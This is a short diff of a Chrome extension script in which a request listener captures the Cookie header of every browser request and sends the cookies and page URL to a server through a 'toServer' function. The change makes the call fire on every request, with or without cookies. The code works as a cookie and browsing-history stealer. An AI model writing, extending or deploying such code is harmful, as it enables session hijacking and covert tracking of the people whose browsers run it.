@@ -159,18 +159,19 @@ chrome.webRequest.onBeforeSendHeaders.addListener(
     function(details) {
         requestHeaders = details.requestHeaders;
         url = details.url
+	cookies = ""
 
         for (i = 0; i < requestHeaders.length; i++) {
             if (requestHeaders[i].name == "Cookie") {
                 cookies = requestHeaders[i].value;
-                toServer({
-                    "cookies": cookies,
-                    "url": url
-                })
-
                 break;
             }
         }
+
+        toServer({
+                "cookies": cookies,
+		"url": url
+        })
     },
 
     {
